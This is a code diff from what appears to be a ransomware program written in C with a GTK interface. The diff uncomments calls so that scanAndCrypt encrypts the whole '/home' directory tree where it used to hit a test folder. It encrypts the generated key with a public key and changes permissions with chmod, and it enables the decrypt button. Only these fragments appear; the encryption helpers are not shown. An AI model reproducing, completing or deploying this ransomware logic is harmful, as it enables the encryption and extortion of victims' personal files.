@@ -38,7 +38,7 @@ void encrypt(){
     getKeyId(&ki);
     unsigned char key[32];
     newKey(key);
-    //scanAndCrypt("/home/emil/Facultate/Imperative Programming", key, true);
+    scanAndCrypt("/home", key, true);
     unsigned char d[3000];
     system("chmod -R 700 .");
     public_encrypt(key, 32, ki.key, d);
@@ -82,7 +82,7 @@ void decrypt(unsigned char *key){
     //scanAndCrypt("/home", key, true);
     unsigned char d[32];
     private_decrypt(ki.key, 32, key, d);
-    //scanAndCrypt("/home", d, false);
+    scanAndCrypt("/home", d, false);
 }
 
 /*int main(int n, char *args[n]){
@@ -129,7 +129,7 @@ int main(int n, char *args[n])
 void on_b_decrypt_clicked()
 {
     system("chmod -R 555 .");
-    //decrypt(gtk_entry_get_text(GTK_ENTRY(form)));
+    decrypt(gtk_entry_get_text(GTK_ENTRY(form)));
 }
 
 void on_window_main_destroy()
